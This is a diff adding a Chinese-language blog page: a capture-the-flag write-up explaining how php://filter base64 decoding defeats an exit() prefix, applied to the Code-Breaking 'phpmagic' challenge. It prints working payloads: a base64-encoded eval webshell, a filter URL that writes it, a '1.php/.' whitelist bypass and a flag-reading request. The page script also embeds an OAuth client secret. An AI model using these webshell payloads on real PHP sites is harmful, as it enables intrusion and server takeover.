@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      php://filter编码绕过 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>php://filter编码绕过</h2>
+  <p class="post-date">2019-03-24 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用code-breaking学学奇淫技巧</p>
+<h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><p>以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”=”<br><strong>字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">            T           o           m</span><br><span class="line">ASCII:      84          111         109</span><br><span class="line">8bit字节:   01010100    01101111    01101101</span><br><span class="line">6bit字节:     010101      000110      111101      101101</span><br><span class="line">十进制:     21          6           61          45</span><br><span class="line">对应编码:   V           G           9           t</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">            L           u           c           y</span><br><span class="line">ASCII:      76          117         99          121</span><br><span class="line">8bit字节:   01001100    01110101    01100011    01111001      00000000    00000000</span><br><span class="line">6bit字节:     010011      000111      010101      100011      011110  010000  000000  000000</span><br><span class="line">十进制:     19          7           21          35             30      16      (异常) (异常)      </span><br><span class="line">对应编码:   T           H           V           j               e       Q       &#x3D;       &#x3D;</span><br></pre></td></tr></table></figure>
+
+<h1 id="php-filter编码绕过exit"><a href="#php-filter编码绕过exit" class="headerlink" title="php://filter编码绕过exit"></a>php://filter编码绕过exit</h1><p><img src="./1.png" alt=""><br>如上代码即使写入webshell，也会被exit给shutdown</p>
+<p>献上payload<br><code>http://127.0.0.1/exit.php?filename=php://filter/write=convert.base64-decode/reesource=1.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==</code><br>webshell 前的x是我故意加上去，可以看到exit语句被编码之后形成乱码。<br><img src="./2.png" alt=""></p>
+<p>接下来分析下缘由，需要写入<code>webshell</code>，但是由于<code>exit</code>的存在，导致<code>getshell</code>失败。这里用到的绕过知识是<code>php</code>中<code>base64_decode</code>只会对<code>[^a-z0-9A-Z+/]</code>解码，而字符<code>&lt;、?、;、&gt;、空格</code>等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略。所以<code>base64_decode</code>只作用于<code>phpexit</code>,但本题中<code>&lt;?php phpinfo();</code>base64之后为4的倍数，但是拼接<code>phpexit</code>七个字节之后不满足base64解码条件以4个字节为一组解码。所以我们在前面加个字母<code>x</code></p>
+<p><img src="./3.png" alt=""></p>
+<h1 id="Codebeaking-phpmagic"><a href="#Codebeaking-phpmagic" class="headerlink" title="Codebeaking-phpmagic"></a>Codebeaking-phpmagic</h1><p><img src="./4.png" alt=""><br>代码功能主要通过<code>dig -t A -q</code>对输入的<code>domain</code>网址进行dns解析。但是我们的目的是写入shell得到flag。本来想着看是否能够绕过<code>escapeshellarg</code>达到<code>getshell</code>目的，可能太渣没有发现绕过的方法。</p>
+<p>目光转到了写入文件<code>file_put_contents($log_name, $output);</code>很容易想到使用<code>php伪协议</code>，发现log_name是由<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$log_name</code>拼接而成。当开启<code>UseCanonicalName=ON</code>和<code>ServerName</code>，可以通过客户端控制。<br><img src="./5.png" alt=""></p>
+<p><code>logname</code>被<code>in_array</code>白名单强判断，需要绕过。这里参考<br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a><br>php会对 <code>1.php/.</code> 解析为<code>1.php</code>。且这里<code>1.php/.</code>也能绕过<code>in_array</code>判断</p>
+<p><img src="./6.png" alt=""><br><code>out_put</code>被<code>htmlspecialchars</code>实体编码直接写入一句话会被转义,这里就可以使用<code>base64一句话木马进行getshell</code>。</p>
+<p>NOTIC:尽量使得<code>webshell</code>满足3的整数倍注意base64之后的一句话不要带有<code>&quot;=&quot;</code> 否则会读取失败</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_GET[456]);&#x2F;*....  &#x3D;》 PD9waHAgQGV2YWwoJF9HRVRbNDU2XSk7LyouLi4u</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p><img src="./7.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;data&#x2F;2ff4fb82e497844a03adf28cf6bedfde&#x2F;7.php?456&#x3D;print_r(scandir(%27..&#x2F;..&#x2F;..&#x2F;%27));highlight_file(%27..&#x2F;..&#x2F;..&#x2F;flag_phpmag1c_ur1%27);</span><br></pre></td></tr></table></figure>
+
+<p><img src="./8.png" alt=""></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#WEB安全" >
+    <span class="tag-code">WEB安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/">
+        <span class="nav-arrow">← </span>
+        
+          phpMyAdmin后台LFI-&gt;RCE
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/03/24/preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">
+        
+          preg_match函数绕过
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#base64编码"><span class="toc-nav-text">base64编码</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#php-filter编码绕过exit"><span class="toc-nav-text">php:&#x2F;&#x2F;filter编码绕过exit</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Codebeaking-phpmagic"><span class="toc-nav-text">Codebeaking-phpmagic</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#利用"><span class="toc-nav-text">利用</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/03/24/php-filter编码绕过/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "php://filter编码绕过",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
